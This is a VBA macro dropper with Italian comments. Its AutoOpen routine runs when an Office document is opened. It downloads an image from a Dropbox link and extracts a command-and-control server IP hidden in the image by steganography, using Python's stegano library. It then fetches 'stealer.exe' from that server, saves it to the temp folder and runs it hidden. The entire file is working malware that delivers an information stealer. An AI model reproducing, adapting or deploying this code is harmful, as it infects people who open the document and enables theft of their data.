Sub AutoOpen()
    Dim serverIP As String
    Dim stealerUrl As String
    Dim stealerPath As String
    Dim imagePath As String
    Dim imageStream As Object
    Dim stealerStream As Object

    ' Path dell'immagine codificata (stessa cartella del progetto)
    imageUrl = "https://www.dropbox.com/scl/fi/o4xfhypsewuvz85xxd0vw/encoded_image.png?rlkey=bywjtcwbicceonn67yx69mxrf&st=kod29s2a&raw=1"
    imagePath = "C:\Users\rocco\AppData\Local\Temp\encoded_image.png"

    ' Scarica l'immagine da Dropbox
    If Not DownloadFile(imageUrl, imagePath) Then
        MsgBox "Errore nel download dell'immagine!"
        Exit Sub
    End If

    Debug.Print "Percorso immagine: " & imagePath

    ' Estrai l'indirizzo IP dal file immagine
    serverIP = GetServerIP(imagePath)
    Debug.Print "Indirizzo IP estratto: " & serverIP

    ' URL dello stealer sul server C2
    stealerUrl = "http://" & serverIP & "/stealer.exe"
    stealerUrl = Replace(stealerUrl, vbCrLf, "")
    stealerUrl = Replace(stealerUrl, vbCr, "")
    stealerUrl = Replace(stealerUrl, vbLf, "")

    
    stealerPath = Environ("TEMP") & "\information_stealer_2.0.exe"
    Debug.Print "URL dello stealer: " & stealerUrl

    ' Scarica e avvia lo stealer
    With CreateObject("MSXML2.XMLHTTP")
        .Open "GET", stealerUrl, False
        .Send
        If .Status = 200 Then
            Set stealerStream = CreateObject("ADODB.Stream")
            stealerStream.Open
            stealerStream.Type = 1
            stealerStream.Write .ResponseBody
            stealerStream.SaveToFile stealerPath, 2
            stealerStream.Close
        End If
    End With

    ' Esegui lo stealer
    Shell stealerPath, vbHide
End Sub
   
Function DownloadFile(ByVal fileUrl As String, ByVal localPath As String) As Boolean
    On Error GoTo ErrHandler
    Dim http As Object
    Dim fileStream As Object

    Debug.Print "Tentativo di download dal link: " & fileUrl
    Debug.Print "Salvataggio in: " & localPath

    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", fileUrl, False
    http.Send

    Debug.Print "HTTP Status: " & http.Status
    If http.Status = 200 Then
        Debug.Print "Download riuscito. Salvataggio in corso..."

        Set fileStream = CreateObject("ADODB.Stream")
        fileStream.Open
        fileStream.Type = 1
        fileStream.Write http.ResponseBody
        fileStream.SaveToFile localPath, 2
        fileStream.Close

        Debug.Print "Download completato!"
        DownloadFile = True
    Else
        Debug.Print "Errore HTTP: " & http.Status
        DownloadFile = False
    End If

    Exit Function
ErrHandler:
    Debug.Print "Errore durante il download: " & Err.Description
    DownloadFile = False
End Function



Function GetServerIP(imagePath As String) As String
    ' Decodifica l'indirizzo IP nascosto nell'immagine
    Dim pythonPath As String
    Dim command As String
    Dim result As String
    Dim output As String
    Dim objShell As Object
    Dim objExec As Object
    
    
    
    ' Indirizzo del Python
    pythonPath = "C:\Users\rocco\AppData\Local\Programs\Python\Python39\python.exe"

    ' Usa la barra normale (/) o raddoppia le barre rovesciate (\\)
    imagePath = Replace(imagePath, "\", "\\")

    command = """" & pythonPath & """ -c ""from stegano import lsb; print(lsb.reveal('""" & imagePath & """'))"""



    
    Debug.Print "Percorso Python: " & pythonPath
    Debug.Print "Command: " & command


    If Dir(pythonPath) = "" Then
        MsgBox "Eseguibile Python non trovato!"
        Exit Function
    End If

    If Dir(imagePath) = "" Then
        MsgBox "Immagine non trovata!"
        Exit Function
    End If
    
    
    Set objShell = VBA.CreateObject("WScript.Shell")
    ' Esegui il comando e cattura l'output
    Set objExec = objShell.Exec(command)
    
    ' Leggi l'output e mostra eventuali errori
    output = objExec.StdOut.ReadAll
    Debug.Print "Output da Python: " & output
    If output <> "" Then
        result = output
    Else
        result = "Errore: Nessun risultato"
    End If
    GetServerIP = Trim(result)
End Function
